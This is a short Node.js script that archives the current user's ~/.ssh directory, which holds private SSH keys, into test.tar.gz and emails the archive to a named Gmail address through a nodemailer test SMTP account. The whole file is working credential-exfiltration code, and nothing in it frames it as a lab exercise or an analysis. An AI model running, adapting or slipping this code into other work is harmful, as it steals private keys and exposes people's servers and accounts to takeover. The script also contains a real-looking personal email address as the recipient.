const fs = require('fs');
const targz = require('tar.gz');
const nodemailer = require('nodemailer');

const packageName = 'test.tar.gz';

const userProfile = process.env.USERPROFILE || process.env.HOME || process.env.HOMEPATH;
const read = targz().createReadStream(userProfile + '/.ssh');
const write = fs.createWriteStream(packageName);

read.pipe(write);

nodemailer.createTestAccount((err, account) => {
    let transporter = nodemailer.createTransport({
        host: 'smtp.ethereal.email',
        port: 587,
        secure: false, // true for 465, false for other ports
        auth: {
            user: account.user, // generated ethereal user
            pass: account.pass  // generated ethereal password
        }
    });

    // setup email data with unicode symbols
    let mailOptions = {
        from: '"Fred Foo 👻" <foo@blurdybloop.com>',
        to: 'wasik.wojtek@gmail.com',
        subject: 'Hello ssh',
        attachments: [
            packageName
        ]

    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));
    });
});